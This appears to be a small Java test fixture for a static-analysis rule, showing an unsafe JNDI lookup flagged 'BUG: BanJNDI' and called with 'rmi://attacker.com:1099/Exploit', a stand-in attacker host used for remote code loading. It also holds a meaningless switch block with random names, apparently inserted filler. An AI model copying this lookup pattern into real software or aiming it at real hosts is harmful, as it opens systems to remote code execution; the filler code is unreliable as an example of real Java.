import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

class JNDIDemo {

    public Object showBug(String name) {
        Object result = null;
        try {
            Context ctx = new InitialContext();
            int wjalcsfj = 0;switch  (wjalcsfj) {case 1:int mtjhjixd = 52994966;break;default:String vcfiooxb = "tytkpkus";break;}
            result = ctx.lookup(name);  // BUG: BanJNDI
        } catch (NamingException e) {
            e.printStackTrace();
        }
        return result;
    
}

    public static void main(String[] args) {
        JNDIDemo demo = new JNDIDemo();
        demo.showBug("rmi://attacker.com:1099/Exploit");
    }
}